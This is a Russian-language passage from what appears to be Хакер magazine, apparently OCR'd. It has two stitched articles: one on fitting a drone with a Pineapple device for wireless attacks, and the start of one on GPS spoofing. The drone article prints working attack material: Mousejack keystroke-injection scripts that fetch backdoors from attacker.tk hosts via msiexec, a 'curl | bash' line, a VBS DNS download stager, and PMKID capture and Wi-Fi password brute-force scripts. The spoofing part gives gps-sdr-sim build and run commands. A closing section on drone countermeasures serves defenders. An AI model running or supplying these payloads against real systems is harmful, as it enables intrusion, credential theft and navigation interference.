Это может быть уже знакомый по предыдущей статье Pineapple. Он без проб-
лем поместится на любой дрон, ведь он маленький и легкий.





  Лег ковесная реализация Pineapple превращает дрон в хакерский инстру -
  мент

Так как этот хакерский девайс может дос тавляться на мес то хоть дро ном, хоть
почтовым голубем, то важна его мас са. Суммарно масса такого Pineapple
вместе с аккумулятором получается все го от 17 до 43  г, в зависи мости
от типа батареи. Дро ны имеют запас мощности для противодействия ветру
и установки экшн-камер и спокойно могут поднять от тре ти до полови ны сво-
ей изначальной массы без зна читель ной потери лет ных характерис тик. Так
что с таким гру зом справится почти любой, даже карманный селфи-дрон.
И это еще одно несом ненное преиму щество перед громоз дким готовым
устройством Pineapple от hak5 — его смо жет под нять далеко не каждый дрон.
  Мол ниеносность — это глав ное условие, которое потенциальный зло-
умыш ленник учи тывает при планировании атак с дро на. Если в пре дыду щей
статье про Pineapple рассмотрены статич ные ата ки на бес провод ные сети,
когда тре буется дол го находиться в неподвижной точке, то с дроном целесо-
образнее про водить динамичные ата ки — быс трые и мобиль ные, покрыва-
ющие мно жество целей.
  Но какие беспроводные технологии могут быть атакованы столь стре-
мительно, что у дрона не успеет сесть аккумулятор? Вполне оче видно, что
это дол жны быть атаки, слабо завязанные на людей, так как людям час то тре-
буется мно го вре мени, чтобы принять решение. Другое дело — чис то компь-
ютерные ата ки, не тре бующие никакого участия поль зователя. Машины не так
медлительны, как человек, и есть нес колько zero  click атак, проведение
которых занимает несколь ко секунд. При этом дрону не нужно даже совер-
шать коротких остановок — все может происхо дить прямо во время полета.
  Далее представлено несколько таких атак, начиная с самых критичных.


Mousejack
Су ществует распространенная уязвимость, надеж но, на десятилетия засев-
шая в сот нях тысяч беспровод ных мышек и клавиатур. Ее экс плуата ция воз-
можна с кинематографичной эффективностью — высочайшей скоростью
(одна-две секунды) и максимальным импактом — RCE, и ата кующий сразу
получает шелл. И имя ей — Mousejack.
   Атака на беспровод ные HID-устройства (мыши и клавиату ры) — это,
пожалуй, самая зрелищная атака, способ ная скомпро мети ровать компьютер
за секунды. Она считается самой опас ной из всех воз можных атак, так
как позволяет минимальными уси лиями, по радиока налу, удаленно отправить
про извольные нажатия клавиш, иными словами, выпол нить произвольный
код. Никаких предварительных подборов паролей, осо бых действий поль-
зователя — сразу RCE.
   Эту атаку можно эффективно проводить с помощью спе циального устрой-
ства CrazyRadio PA и любого одноплатника, например Raspberry, или уже зна-
комого нам устрой ства Pineapple, раз работанного спе циально для атак
на бес про вод ные сети. Усло вие старта для ата ки может быть добавлено так:


startup.sh
...
elif lsusb | grep -q 'Nordic Semiconductor'; then
  echo "[*] mousejack attack"
  cd mousejack
  screen -dmS mousejack -t jackit -L -Logfile "$time-mousejack-%n.
log" './mousejack.sh'
  cd -
...

Ины ми словами, если в Pineapple вставлен донгл CrazyRadio PA, то автомати-
чески запускается атака на беспро водные мыши и кла виату ры:


mousejack/mousejack.sh
#!/bin/bash


led green on
python3 jackit --autopwn --script ducky.txt
led green off

Так как ата кующий не зна ет адреса бес провод ных устройств, он вынужден
ата ковать все, что слы шит в радиоэфире, поэтому используется флаг autop-
wn.
   Если соединить CrazyRadio с Pineapple, получится очень опасное хакер-
ское устройство.





  Устрой ство, способное на рас стоянии взломать компь ютер через бес-
  провод ную перифе рию

Дрон с таким устройством сможет пробить периметр практичес ки любой ком-
пании.





               Дрон заряжен Mousejack и готов лететь

Такой дрон будет атаковать все устрой ства вок руг себя, пока летит.
   Экс плуата ция Mousejack очень похожа на BadUSB-hid. Тут атакующий
сталкива ется с теми же проб лемами при наборе команд:
 • при исполь зовании нажатий клавиш приходится угадывать язы ковую рас-
   клад ку;
 • при исполь зовании ALT-кодов для набора текста команд (воз можно только
   на Windows) — угадывать статус клавиши Num Lock.

И в том и в другом случае злоумыш ленни ку придется для надежности
засылать нажатия дваж ды, меняя либо раскладку, либо статус NumLock. Но в
слу чае с ALT-кодами понадобится в три-четыре раза больше нажатий. А если
нет разницы, то зачем переда вать больше? В общем, тут снова раци ональнее
использовать простой метод отправки нажатий непос редс твенно самих кла-
виш вместо их кодов:


mousejack/ducky.txt
GUI SPACE
GUI r
DELAY 300
STRING msiexec /i https://en.attacker.tk/backdoor.msi /quiet
DELAY 300
ENTER


SHIFT ALT
DELAY 300
SHIFT CTRL
DELAY 300


GUI r
DELAY 300
STRING msiexec /i https://ru.attacker.tk/backdoor.msi /quiet
DELAY 300
ENTER

Так  как  исполь зуется  радиоканал,  ата кующий  неиз бежно  столкнет ся
с помехами. Чем длиннее набираемая коман да, тем боль ше вероятность, что
та или иная клавиша «не долетит». Дос таточно все го одной ошибки, чтобы
RCE-команда не распозналась.
  Приведенный здесь пример уже зна ком читателям по статье про BadUSB-
hid. Эта воз можность имеется в любой ОС Windows, она поз воляет за одно
дей ствие скачать и запустить указанную программу удаленного управле ния.
Под ОС семей ства Unix зло умышленник может использовать команду из раз-
ряда curl -L http://rce.attacker.tk/1.sh|bash.
  Далее успешность ата ки зависит только от лов кости управле ния дро ном
и наличия беспроводных мышек в радиусе око ло 10–15 м. Pineapple на дроне
будет пытаться взломать каждый компь ютер через вновь пойманный ради-
осигнал от мыш ки или клавиатуры. Эффект ата ки дела ет ее похожей на фильм
или игру про хакеров, где взлом с помощью дро на происходит за несколько
секунд.





             Скриншот из компьютерной игры Watch Dogs 2




                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ




              СТРОИМ ХАКЕРСКИЙ БЕСПИЛОТНИК:
                            ДАЛЬНОБОЙНЫЙ
                   И С ЗАЩИТОЙ ОТ ГЛУШИЛОК




Ре альный мир отличается от вымыш ленного. Большая часть из того, что
показано в играх и фильмах о возможностях хакеров, имеет мало общего
с реальностью, но эта атака — одна из нем ногих, которые в жиз ни выглядят
точно так же, как на экране.
  Представь: ты сидишь дома или работаешь в офи се, где-нибудь на вер-
хних этажах или в глубине режимного объекта, в сот нях метров от охра няемо-
го контрольно-пропускного пункта. Кажется, что ты в пол ной информацион-
ной безопасности и внеш ний наруши тель до тебя не доберется. Но тут к зда-
нию подлетает подоб ный дрон, и, пока ты удивленно смотришь на него через
окно (а воз можно, ты даже и не заметишь его вовсе), он всего за секунду
запустит вре доносный код на тво ем компь ютере. Так что ты вряд ли успе ешь
заметить что-либо подоз рительное, а если и заметишь, то вряд ли сопос-
тавишь появ ление в небе дрона с установ кой бэкдора на твоем компьютере.
С использовани ем этого метода злоумыш ленник сможет проникнуть в кор-
поратив ную сеть — последствия это го, думаю, объяснять никому не нужно.





             Пробив периметра с дро на за одну секунду

Дрон исполь зует еще и эффект отвлечения: поль зователь смотрит в окно,
пока на его ноут буке на долю секунды всплывает окно «Пуск → Выполнить»
и запускает ся бэкдор или RAT. Через пару минут, вероятно, злоумышленник
уже успе ет опробовать пару-трой ку экс пло итов.
  По иронии судь бы чаще всего беспровод ные мышки и клавиату ры есть
либо у IT-пер сонала, либо у руководителей. Так что добыча злоумышленника
будет сразу весомая. Воз можно, это окажет ся комп доменного адми нистра-
тора, в таком случае события уже во внутренней сети будут развивать ся стре-
мительно. А возможно, это будет какой-то началь ник, на рабочем столе
которого много ценных файлов. Сло вом, какой бы компьютер это ни был, он,
скорее все го, подклю чен к внутренней сети, а значит, злоумышленник поч ти
наверняка дос тигнет главной цели — пробития периметра.
   Чтобы пробить периметр опи санным способом, с компьютера, под-
верженного этой атаке, должен быть выход в интернет до опор ного сер вера
злоумышленника. Отту да он ска чивает и запускает бэкдор, на который потом
пос тупают команды управления. Но далеко не в каждой внутренней сети раз-
решены прямые соединения на внешние IP-адреса. Однако популярные
методы эксфильтрации, такие как DNS, впол не могут работать, и произволь-
ные запросы, содержащие дан ные, могут выходить из сети наружу почти всег-
да. Это значит, что такой канал может быть использован как тран спорт
для скачивания бэк дора и его последующей работы.
  Ре али зовать загрузку нужной хакеру программы по DNS можно и базовы-
ми средс твами любой ОС. Нап ример, для Windows самым переносимым спо-
собом является VBS-скрипт, который написан на полноценном интерпре-
тируемом языке программирования (смот ри статью про методы инфильтра-
ции и эксфильтации). Но раз мер вво димой в окно «Выполнить» команды
огра ничен, и для набора VBS-скрипта, загружающего средство удаленного
управле ния через DNS, зло умышленни ку потребу ются минимум три команды:


mousejack/ducky-dnsexec.txt
GUI r
DELAY 300
STRING cmd /C "(echo On Error Resume Next& echo Set objShell =
CreateObject^("WScript.Shell"^)& echo Set writer = CreateObject^("
Scripting.FileSystemObject"^).createtextfile^("out.exe"^))>1.vbs&
ping x1.attacker.tk"
ENTER


GUI r
DELAY 300
STRING cmd /C "(echo For d = 1 To 927& echo pos = 0& echo While pos
= 0& echo Set exec = objShell.Exec^("nslookup -type= txt d"^&d^&".txt.
attacker.tk"^)& echo res = exec.Stdout.ReadAll^(^))>>1.vbs& ping x2.
attacker.tk"
ENTER


GUI r
DELAY 300
STRING cmd /C "(echo pos = inStr^(1,res," ?"^)& echo txt = Mid^(res,
pos+1,253^)& echo Wend& echo For b = 0 To Len^(txt^)/2-1& echo
writer.Write Chr^(CInt^("^&H" ^& Mid^(txt,1+b*2,2^)^)^)& echo Next&
echo Next)>>1.vbs& ping x3.attacker.tk"
ENTER


GUI r
DELAY 300
STRING cmd /C "wscript 1.vbs & out.exe"
ENTER

При выполнении команд на сервер злоумыш ленни ка дол жно прий ти три DNS-
отстука, означающих успешность набора команд.
   Это отличный при мер того, как ты или твоя компания могут быть легко
взло маны, при чем даже без дрона (об этом в одной из следующих статей).
И чем больше ком пания, тем выше веро ятность встре тить подверженную уяз-
вимос тям беспровод ную перифе рию. Мой опыт показы вает: несмотря на то
что эта уязвимость най дена еще в 2016 году, о ней до сих пор мало кто зна ет.
А те, кто знает, сильно ее недооценивают. Тем не менее встречается она пов-
семес тно. А аппаратная специфика этой  уяз вимости обеспечивает ей
еще дос таточ но дол гую жизнь, ведь компь ютер ные мышки мы не при выкли
менять так же часто, как телефо ны.


Àòàêà EAP
В статье про Pineapple уже рассматривались ата ки на WPA Enterprise, но там
описано возможное их при менение в ста тичном режиме — с ожи данием
попадания кли ентов в радиус дей ствия. С дро ном хакер может провес ти
такую атаку в ином ключе — динамично, самостоятельно обнаружи вая и ата-
куя кли ентские устрой ства.
   Те перь он в состоянии облететь каждое зда ние, где размещаются цели
атак. Так как отправ ка учетных дан ных WPA Enterprise не требует учас тия поль-
зователя, она про исходит достаточ но быс тро, что делает эту атаку воз можной
даже без остановки пролетающего мимо дрона.
  На представленной ниже иллюс трации телефоны сотрудни ков бессозна-
тель но кинули в пролетающий мимо дрон учетные записи корпоративной бес-
про вод ной сети.





         Компьютер ная атака с дрона на клиентское устройство

Для реали зации такой атаки зло умышленни ку не нужно дораба тывать скрипты
Pineapple. Все необ ходимое уже проделано в соответствующем разделе пре-
дыдущей статьи. Для активации атаки на Pineapple прос то ставится перемыч-
ка на GPIO-25 (замыкающая пины 20 и 22), после чего устройство включает-
ся. Загорелся зеленый светодиод — значит, точка доступа поднялась и ата-
кующий может лететь. Дрон вмес те с устройством прилетает обратно, горит
красный или желтый све тодиод — зна чит, мы вернулись не с пустыми руками
и пароль или хеш чьей-то доменной учетки сохранен на карте памяти. С этой
домен ной учеткой злоумыш ленник впоследс твии может получить удаленный
доступ к почте и рас крыть кон фиденциальные данные или даже, при наличии
у компании VPN, получить дос туп в ее локальную сеть.


Çàõâàò õåíäøåéêà WPA è PMKID
В пре дыдущей статье про Pineapple рассмотрен ряд атак на аутентифика цию
Wi-Fi. Аутен тификация (захват PMKID) и деаутентификация (захват WPA Hand-
shake) про исходят дос таточно быстро. Более того, если захват WPA Hand-
shake тре бует определенных обстоятель ств (наличия клиентов), то захватить
PMKID, если имеется уяз вимая точка доступа, можно всегда и достаточ но
быстро.
  PMKID — это еще один пригодный для брутфорса хеш, который можно
получить из пер вой части четырех ступенчатого рукопожатия (EAPOL M1).
Для это го не нужны аутентифицированные клиенты, такой пакет точка доступа
может отпра вить атакующему сама в ответ на зап рос ассоциации:


wpapsk/auth.sh
#!/bin/bash


dumpfile="pmkid-$(date +'%H:%M:%S_%d.%m.%Y')"


hcxdumptool -i mon0 --enable_status= 7 -o $dumpfile.pcapng
--disable_client_attacks --disable_deauthentication $* | while read
line
do
    if echo "$line" | grep -q 'PMKIDROGUE:'; then
        led yellow on 2> /dev/null
    fi
done
tcpdump -r $dumpfile.pcapng -nn -w $dumpfile.pcap
rm -f $dumpfile.pcapng

По ка дрон летит, этот скрипт отправляет запрос ассо циации на каж дую точ ку
доступа в пре делах досяга емости радиосигнала.





             Компьютерная атака с дрона на точку дос тупа

Как толь ко PMKID захвачен, загора ется желтый светоди од. И WPA handshake,
и PMKID дает хеш-сумму, по которой можно восста новить пароль к точке дос-
тупа методом перебо ра по словарю:


wpapsk/brute-pmkid.sh
#!/bin/bash


while sleep 60
  for pcap in * .cap
  do echo "$pcap"
    hcxpcapngtool "$pcap" --pmkid=/tmp/m1.pmkid
    hcxhash2cap --pmkid=/tmp/m1.pmkid -c /tmp/out-pmkid.pcap


    for bssid in $(echo 0 | aircrack-ng "/tmp/out-pmkid.pcap" | grep
'with PMKID' | awk '{print $2}')
    do
      if [ -f "/tmp/$bssid" ]; then
        continue
      fi
      touch "/tmp/$bssid"
      aircrack-ng -w /home/pi/wpapsk/passwords_top1k.txt -b "$bssid"
"/tmp/out-pmkid.pcap" -l "$bssid.txt"
      if [ -s "$bssid.txt" ]; then
        led red on 2> /dev/null
        exit
      fi
    done


    rm -f /tmp/m1.pmkid
    rm -f /tmp/out-pmkid.pcap
  done
done

Pineapple с таким скриптом в сос тоянии сам опре делить слабые пароли к точ-
кам дос тупа. Для это го сначала удаляются все пакеты EAPOL M2 (handshake),
так как проверя ются толь ко с PMKID. Пос ле их уникализации, чтобы не бру-
тить одни и те же хеши мно гократно, запус кается уже брут форс прямо в воз-
духе. Если пароль подоб ран, загорается красный све тоди од.
   Скрипт служит хорошим примером манипуляции набранными хешами,
ведь в таком случае aircrack-ng при наличии handshake игнориру ет PMKID.
Вообще, брутить хеши целесообразно на более мощном оборудовании, ведь
все собранные в полете хеши сохраняются на карте памяти Pineapple.


Ðàçâåäêà áåñïðîâîäíûõ ñåòåé
При мени тельно к ата кам на бес провод ные сети дрон весьма неп лохо под-
ходит на роль разведчика. Раз местив все тот же Pineapple и подключив к нему
внешний GPS-донгл, атакующий может триангу лировать расположение каж-
дого беспроводного устройства (точек дос тупа Wi-Fi, клиентов, Bluetooth-
устройств и даже беспроводных мышек и клавиатур) и фик сировать их рас-
положение на карте. Эта информация может быть очень актуальна как для
ата кующе го, выяв ляющего поверхность будущих атак, так и для защитников,
контро лирующих свои ресурсы. Ведь весь необходимый сбор данных и рас-
четы полностью про изводит прог рамма Kismet. На выходе — дамп SQLite,
удобный для самостоятельного парсинга.
  Для географической разведки бес провод ных сетей требуется лишь два
ком понента, которые на Pineapple запускаются при старте в положении
перемычки на 27-м GPIO:


startup.sh
...
elif jmp 27; then
  echo "[*] wi-fi recon (dynamic)"
  monitor_enable
  cd recon
  screen -dmS recon -t gpsd -L -Logfile "$time-recon-%n.log" './gps.
sh'
  screen -r recon -t kismet -X screen './kismet.sh'
  screen -r recon -t tcpdump -X screen './tcpdump.sh'
  cd -
...

Когда устанав ливается соединение со спутниками, зеленый светодиод дает
понять, что мож но лететь:


recon/gps.sh
#!/bin/bash


gpsd -N /dev/ttyACM0 -D 5 | while read line
do echo "$line"
    if echo "$line" | fgrep -q 'GPS:'; then
        led green on 2> /dev/null
    fi
done

Успешный запуск Kismet, в свою очередь, зажига ет жел тый све тоди од:


recon/kismet.sh
#!/bin/bash


kismet -c mon0 | while read line
do echo "$line"
    if echo "$line" | fgrep -q 'success'; then
        led yellow on 2> /dev/null
    fi
done

Те перь пос ле обле та территории или даже заг рузки GPS-маршрута в дрон
ата кующий либо защитник могут в автоматическом режиме более качествен-
но выпол нить анализ беспроводных сетей, покрывая максимум тер ритории.
Полученный дамп может быть преобразован в веб-страницу, содержащую
удобную интерактивную карту, на которой наложе но рассчитанное мес-
тоположение источников сиг нала, а также постро ена тепловая карта сиг-
налов, как на сле дующем рисунке.





  Визуали зация соб ранной информации о беспроводных устройствах
  (местоположение и тепловая карта)

Теп ловая карта показывает уровень сигнала от бес провод ных устройств
в каждой иссле дованной точке. Любая точ ка доступа или кли ент на такой кар-
те по клику мыш кой обводится окружностью, показывающей область ее слы-
шимости.





          Область слышимос ти беспро водного устройства

При этом тепловая карта, как можно заметить, перестраивает свой цвет
под каждое выб ранное беспроводное устройство, тем самым показывая,
в каких местах и как принимался сигнал от него. Каж дая область, где про-
летал дрон, при выборе мыш кой показывает бес про вод ные устройства, дос-
тупные именно там.





      Слы шимые бес про вод ные устройства в опре деленной точке

Все вместе это дает представление, не выходит ли зона приема за контро-
лируемую область, где может находить ся злоумыш ленник.


Ïîñòýêñïëóàòàöèÿ
Ес ли ата ка будет успешной, зло умышленни ку, веро ятно, при дется вернуться
и вос пользоваться обна ружен ной уязвимостью. Ведь подоб ранный пароль
или перех вачен ные учет ные данные сработа ют только для конкретной бес-
про вод ной сети. В таком слу чае дрон может доставить Pineapple, снаб-
женный 4G-модулем для удаленного подклю чения к беспро водной сети
на охраняемой территории.





  Дрон доставляет Pineapple, снаб женный 4G-модемом, для удаленного
  дос тупа

Как использовать Pineapple в качес тве средства удаленного доступа, про-
демонстри ровано в предыдущей статье.
  Дрон с Pineapple на борту может приземлиться на кры шу здания. С вык-
люченными пропеллерами он в состоянии ожидать достаточно дол го. А тем
вре менем зло умыш ленник может удален но подклю чить ся к скомпромети-
рованной беспроводной сети и развивать даль нейшие ата ки уже по внут-
ренним сетям. И вполне вероятно, что внут ренняя сеть в результате такого
про никновения падет раньше, чем на кры шу поднимут ся сотрудни ки службы
безопасности. Впрочем, в таком случае дрон может стремительно улететь,
уне ся на своем бор ту и Pineapple, и 4G-модем. Так что не останется никаких
следов. © X





Дрон способен преодо леть мно жество классических защитных мер. Пропус-
кной пункт, две ри на эта же или в кабинете, даже заборы для него не проб-
лема. И чем крупнее ком пания, тем выше вероятность встретить уяз вимый
ком понент и тем весомее потен циальная добыча злоумышленника.
  Мож но рассмот реть следующие варианты защиты от некоторых дронов:
 • од на из так тик защиты — это нападе ние. Дрон, управляемый по Wi-Fi, —
   это, по сути, лета ющий роутер. К нему мож но подключить ся, как к обычной
   Wi-Fi-сети, исполь зуя прос тые заводские пароли, после чего перехватить
   виде осиг нал, идущий RTSP-потоком, или перекрыть канал управления;
 • примене ние обычных подави телей дронов,  так  как они рас считаны
   на наибо лее популярные протоколы (FRSKY, ELRS или TBS), по которым
   управляются даже про фессиональные дроны;
 • мно гие дро ны после потери сигнала с пуль та управления экстренно садят-
   ся, но некоторые улетают обратно по GPS-координатам. Подавители
   ради осигналов, сообщающих под дельные координаты, могут заставить
   дрон экстренно сесть в заданной точке;
 • для модифициро ванных дронов с самодельными режимами управления
   (нап ример, 4G) можно использовать направленные подавители сигналов.

Сре ди общих мер, которые защищают от любых дронов, можно отме тить сле-
дующие:
 • экранирование — размещение кри тических объ ектов в помещениях
   со спе циальными ограждающими конструкциями, которые препятс твуют
   распространению элек тромагнитных излучений за пределы помещения
   (контро лируемой зоны);
 • внеш нее зашум ление электромагнитны ми вол нами, которые не позволяют
   дрону обнаружить уязвимые беспровод ные устройства;
 • кон троль физического дос тупа в пределах радиуса действия беспровод-
   ных устройств — пос кольку дрон главным образом направлен на обход
   физических барьеров, а не технических уязвимос тей, защиту от него мож-
   но рассматривать в том же ключе;
 • размещение критических объектов вда ли от внешних ограждающих конс-
   трукций — в глубине защищенного здания или под землей.
COVERSTORY





          СПУФИМ GPS
            В 2023 ГОДУ





Каж дый  из  нас  пользует ся  спутниковой
навигацией, что бы добраться куда угодно
за пределами своего дво ра. А что, если
в один момент GPS перестанет быть таким
надежным    средс твом    определения            qeewqq                                                                                  qeewwqqq@gmail.com
локации? В этой статье я покажу работа-
ющий спо соб обма нуть эту систему.




                    Не повторяй действия, описанные в статье, вбли-
                       зи аэропортов и дру гих объектов, которые сильно
                        зависят от геопо зиционирования! Работа в эфире
                        требует специального разрешения и должна про-
                       водиться с соблюдением мер предос торожности.
                        Статья публикуется исключительно в образова-
                         тельных целях, и ни автор, ни редакция «Хакера»
                      не несут ответс твен ности за дей ствия, совер-
                    шенные с использованием этого матери ала.



ÒÅÎÐÈß

GNSS
Global Navigation Satellite System (GNSS) поз воляет пользовате лям сис темы
определить их местоположение. GNSS пред став ляет собой сеть из разных
спут никовых и наземных систем. Самые известные из них — аме риканский
GPS и российский ГЛО НАСС. Еще можно вспом нить Galileo (страны ЕС)
и BeiDou (Китай), но они распростра нены куда мень ше.
  Для опре деления местоположения используются три основные группы
устройств: космические, пользовательские и другие наземные (сегмент кон-
троля).
   Космические устройства — это, как ты догады ваешь ся, спутники. У каждой
системы — свои спутники, летающие на разных орби тах. Спутники трансли-
руют данные на разных частотах и в разные про межутки вре мени, чтобы
не мешать друг другу.
  Наземные сис темы отвечают за син хрониза цию времени, правильность
информации на спутниках, корректи руют орбиты и проверяют ключевые фун-
кции спут ника — вдруг он сломает ся?
   Пользователь ский сегмент — это клиентские устрой ства, которые опре-
деляют свое местополо жение с исполь зовани ем GNSS. Самый простой при-
мер — обычный приемник GNSS в твоем телефоне.
   Чтобы определить мес тоположение, любое конеч ное устрой ство дол жно
получить данные со спутника и как-то их обработать. Про цесс обработ ки сиг-
налов и определе ния местоположения называ ется триангуляцией (хотя есть
и другие методы).


×àñòîòû
В зависи мости от кон кретной спут никовой сис темы GNSS использует разные
частоты для переда чи данных. Пробежимся по трем гигантам, их час тотам
и назначению этих частот.
  GNSS работает на трех основных полосах: L1, L2 и L5. Все они появлялись
пос ледовательно, как улучшенные версии навига ционной сис темы. Называ-
ется это все «L-диапазон», или диапазон дециметровых волн. Диапазон опи-
сывает частоты от 1 до 2 ГГц или от 1000 до 2000 МГц. На одной полосе
может работать сразу нес колько навигационных сис тем: к при меру, в полосе
L1 работают одновре мен но GPS, ГЛО НАСС и Galileo.
  L1 — самая ста рая полоса, которую используют поч ти все спутниковые
навигационные системы. Пос кольку она древняя, ее могут принять прак-
тически все приемники. Единс твенный минус — сигнал в этом диапа зоне час-
тот име ет низкую способность огибать препятс твия и проходить сквозь них
(стены зданий, листва деревьев или слиш ком гус тая облачность).
  L2 появилась как замена L1. Сиг нал в этой полосе лучше огибает препятс-
твия, ловить его мож но даже в труднодос тупных местах. Эта полоса считает ся
новой, так что обыч но ее исполь зуют заодно с L1.
  L5 — новей шая технология, исполь зуется в основном для нужд авиации,
хотя гражданские при емники тоже иног да могут с ней работать.




GPS работа ет во всех трех диапазонах, в то время как альтернативные
навигационные системы пока не заняли все доступные частоты. В L1 про-
живают GPS (1575,42 МГц), ГЛО НАСС (1602 МГц) и Galileo (1575,42 МГц).
В L2 GPS работает на час тоте 1227,6 МГц, а ГЛОНАСС — на 1246 МГц.
В L5 есть Galileo (1207,14 МГц и 1176,45 МГц) и GPS (все го одна час тота —
1176,45 МГц).
   Частоты для граж данско го и военного примене ния раз личаются, и в
сегод няшней статье мы будем рас сматривать только гражданские варианты.
Кро ме того, сигнал для воен ного использования куда более точный, но он
зашифрован во избежание использования недружественными армиями.


Назначения полос могут менять ся в зависимос ти от навига ционной сис темы.





                Час тоты и полосы, используемые GNSS

Частоты, отме ченные  как ARNS, обыч но исполь зуют  в авиации,  тог да
как наземные приемни ки используют час тоты RNSS.


Òðèàíãóëÿöèÿ è òðèëàòåðàöèÿ
Спут ник не может отправить тебе твое мес тоположение, потому что мес-
тоположение у каждого свое, а твое устрой ство ничего наружу не переда ет.
То есть координаты нуж но вычислять непосредственно на приемнике, а для
этого сигнала одно го спутника недостаточно, так что при ходится ловить сра зу
несколько (обычно хотя бы три-четыре). Все они отправляют тебе свои собс-
твен ные коор динаты и вре мя. Уже из этих дан ных по простым формулам мож-
но опре делить мес тополо жение. Для поиска координат используются два
основных спо соба: триангу ляция и трилате рация.
   Три ангуляция — это определе ние мес тополо жения точки по трем ори-
енти рам. Ори ентирами в этом случае выс тупа ют спутники, но, так как кос-
мичес кие аппараты лета ют на высоте око ло 20 тысяч километров, исполь-
зовать такой метод весьма слож но из-за необходимос ти очень точно знать
рас стояние до каждого из спутников. Что бы облегчить процесс, исполь зуется
трилатерация.
   Три лате рация —  это метод определения координат  точки, который
использует систему сфер.





                          Трилатерация

Рассто яние до спутников можно определить по времени прохождения сиг-
нала от спут ника до приемника, умножен ному на скорость света, но для этого
нуж но знать точное вре мя, в которое сигнал был отправлен.




На практике, если у тебя есть, например, микроконтроллер, не нужно самос-
тоятельно решать эту горку линейной алгебры, чтобы просто получить свои
коор динаты. Все это с успехом делают дешевые GNSS-при емни ки, которые
вып люнут тебе координаты и источник их получения (из какой именно спут-
никовой системы) в формате NMEA.





                         GPS-при емник

NMEA — это стандартизиро ванный фор мат для передачи данных GNSS. То
есть если ты захочешь сделать устройство, которое будет работать с GNSS,
то нужно будет работать с форматом NMEA, а не искать документацию к фор-
мату каж дой спут никовой сис темы.
   Чтобы получить эти данные, можно под клю читься к при емни ку по USB
или UART. У меня распаян только UART, так что я соору дил мост из Auduino
и вышел на улицу, что бы собрать данные.
   Если использовать готовый при емник GNSS, то на его выходе можно уви-
деть при мерно следующую картину:


 $GPRMC,102668.00,A,2565.63860,N,05723.41802,E,44.621,122.82,301122,,
 ,A*54
 $GPVTG,122.82,T,,M,44.621,N,82.638,K,A*34
 $GPGGA,102669.00,2995.64530,N,05723.40668,E,1,04,2.16,19.7,M,-26.4,
 M,,*48
 $GPGSA,A,3,07,09,04,14,,,,,,,,,6.09,2.16,5.70*05
 $GPGSV,2,1,05,04,43,108,34,07,53,338,35,09,73,051,37,14,33,217,28*7B
 $GPGSV,2,2,05,16,04,038,*44
 $GPGLL,2585.64930,N,05123.40668,E,102608.00,A,A*6E
 $GPRMC,107129.00,A,2565.63860,N,05723.41802,E,47.084,123.07,301122,,
 ,A*5C


Это сообщения в фор мате NMEA, то есть уже обра ботанные GNSS-при емни-
ком данные со спут ника. Выглядит не совсем понятно, но на самом деле
получить из этого наши координаты довольно просто.
   Разберем для при мера первое сообщение:


 $GPRMC,102668.00,A,2565.63860,N,05723.41802,E,44.621,122.82,301122,,
 ,A* 54


Как ты уже заметил, каж дое сооб щение начинается со знака дол лара,
за которым следуют пять букв и запятая. Этот заголо вок указывает тип данных
в сообщении. Пер вые две буквы (в нашем случае GP) указывают на систему
GNSS, из которой получена информация. Наше GP означает GPS. Ты можешь
встре тить и другие спутниковые системы — вот список воз можных ответов:
 • GP — толь ко GPS;
 • GL — толь ко ГЛО НАСС;
 • BD — только BeiDou;
 • GA — только Galileo;
 • GN — исполь зовано одновременно нес колько систем.

Следующие три буквы означают тип данных, нап ример RMC (Recommended
Minimum Specic GNSS Data) — минимальные рекомендуемые данные о мес-
тоположении и вре мени. Координаты содер жатся в сообщениях RMC, GLL
и GGA.
  Опустим все поля, кроме координат (описание пропущенных полей можно
почитать в до кументации NMEA). 2565.63860,N — это широта в формате
DDMM.MMMMM, где N означает север ное полушарие, а 05723.41802,E —
это долгота в фор мате DDDMM.MMMMM, где E означает восточное полуша рие. То
есть коор динаты нашей тес товой точ ки — 25 гра дусов 65,63860 минуты
северной широты и 57 градусов 23,41802 минуты восточной долготы.
   Чтобы посмотреть эту точку на картах в интерне те, нужно пре обра зовать
GPS-координаты в десятичные гра дусы. Для этого можно вос пользоваться
онлайновым калькулятором.



TTFF
TTFF — time to rst x, или время для опре деления местоположения. Это вре-
мя, которое нуж но устройству, что бы соб рать дан ные и определить мес-
тоположение. Для спуфинга этот параметр очень важен.
   Если устройство не имеет никаких данных о спутниках, процесс может
занимать до двенадцати минут, но обыч но требует все го две-три минуты.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ




                             СПУФИМ GPS
                                 В 2023 ГОДУ





ÏÐÀÊÒÈÊÀ

Гай дов по спуфингу GPS в сети хватает, но у них есть одна общая чер та:
в 2023 году они не работа ют (у меня так точ но). Мно гие телефоны сейчас
уме ют определять местоположение не только по спутникам — для этого
используются Wi-Fi и Bluetooth. Сотовые вышки тоже могут учас твовать в про-
цессе. Для начала мы попробуем подменить GPS на смартфоне с Android
и пос мотрим, какие трудности могут возникнуть при подмене.


Îáîðóäîâàíèå
В сво ем эксперименте я использую:
 • bladeRF 2.0 Micro Xa4 в качестве передатчика;
 • HackRF One в качестве приемни ка и передатчика;
 • антенну RFSPACE;
 • Mi A2.





                              BladeRF





                          HackRF one





                          RFSPACE





                                Mi A2


GPS-SDR-SIM
GPS-SDR-SIM поз воля ет сгенерировать данные для любой локации или тра-
ектории. Для этого нужно ска чать таб лицу эфемерид (коор динат спутников
для опре деленного времени) и указать локацию.




                     GPS-SDR-SIM — один из самых популярных и уж
                         точ но самый извес тный инс трумент для подмены
                     GPS-дан ных. На момент публикации репозиторий
                       насчитыва ет уже больше 2000 звезд и регулярно
                       обновля ется.


Итак, сначала скачаем исходни ки и соберем программу:


git clone https://github.com/Nuand/gps-sdr-sim
cd gps-sdr-sim
gcc gpssim.c -lm -O3 -o gps-sdr-sim

Под клю чим bladeRF и сге нери руем файл:


./gps-sdr-sim -e hour3060.22n -l 21.296965,-157.815687,100 -b 16 -o
gpssim.bin -t $(date -u +%Y/%m/%d,+%X)




                     Дан ные о спутниках можно ска чать с сайта NASA.
                          Тут предоставлены дан ные за каждый час, что
                       позволит избежать ошибки со временем — она
                         есть почти во всех гайдах, которые я смог найти.


Параметр -t отве чает за вре мя, которое будут передавать «спутники». Этот
параметр очень важен, так как новые телефоны не работают с данными,
которые отста ют по времени всего на два-три часа.



  Using static location mode.
  Start time = 2022/11/02,07:21:33 (2234:285693)
  Duration = 300.0 [sec]
  02 180.0 25.6 22759545.5  6.5
